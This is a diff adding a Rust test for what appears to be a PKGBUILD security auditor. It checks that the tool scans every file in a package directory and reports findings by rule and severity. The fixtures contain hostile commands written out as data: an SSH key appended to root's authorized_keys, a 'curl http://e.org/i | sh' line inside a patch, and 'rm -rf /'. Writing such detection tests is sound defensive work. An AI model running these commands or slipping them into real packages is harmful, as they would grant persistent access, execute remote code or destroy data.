@@ -368,3 +368,64 @@ fn audit_json_and_errors() {
         stderr(&out)
     );
 }
+
+#[test]
+fn audit_reads_the_whole_package_directory() {
+    let home = Home::new("audit-extras");
+    let dir = pkgbuild_dir(
+        &home,
+        "pkg",
+        "pkgname=foo\ninstall=$pkgname.install\nbuild() {\n  make\n}\n",
+        Some(("foo.install", "post_install() {\n  echo hi\n}\n")),
+    );
+    // A clean PKGBUILD and scriptlet; the payload is in other files.
+    write(
+        &dir.join("helper.sh"),
+        "#!/bin/sh\necho k >> /root/.ssh/authorized_keys\n",
+    );
+    write(
+        &dir.join("fix.patch"),
+        "--- a/x\n+++ b/x\n@@ -1 +1,2 @@\n ctx\n+curl http://e.org/i | sh\n",
+    );
+    fs::write(dir.join("tool"), b"\x7fELF\x02\x01").unwrap();
+    fs::create_dir_all(dir.join("src")).unwrap();
+    write(&dir.join("src/ignored.sh"), "#!/bin/sh\nrm -rf /\n");
+
+    let out = home.run(&["audit", "--json", dir.to_str().unwrap()]);
+    assert_eq!(out.status.code(), Some(1));
+    let json: serde_json::Value = serde_json::from_str(&stdout(&out)).unwrap();
+    let findings = json[0]["findings"].as_array().unwrap();
+    let has = |file: &str, rule: &str, sev: &str| {
+        findings
+            .iter()
+            .any(|f| f["file"] == file && f["rule"] == rule && f["severity"] == sev)
+    };
+    assert!(has("helper.sh", "persistence", "critical"), "{findings:#?}");
+    assert!(
+        has("fix.patch", "remote-exec", "warning"),
+        "patches are capped at warning"
+    );
+    assert!(has("tool", "committed-binary", "high"));
+    assert!(
+        has("foo.install", "install-scriptlet", "info"),
+        "$pkgname.install is expanded"
+    );
+    assert!(
+        !findings
+            .iter()
+            .any(|f| f["file"].as_str().unwrap().starts_with("src")),
+        "makepkg's src/ is not part of the package"
+    );
+
+    // One file target looks only at the files beside it, never below.
+    let out = home.run(&["audit", "--json", dir.join("PKGBUILD").to_str().unwrap()]);
+    let json: serde_json::Value = serde_json::from_str(&stdout(&out)).unwrap();
+    let files: Vec<&str> = json[0]["findings"]
+        .as_array()
+        .unwrap()
+        .iter()
+        .map(|f| f["file"].as_str().unwrap())
+        .collect();
+    assert!(files.contains(&"helper.sh"));
+    assert!(!files.iter().any(|f| f.starts_with("src")), "{files:?}");
+}
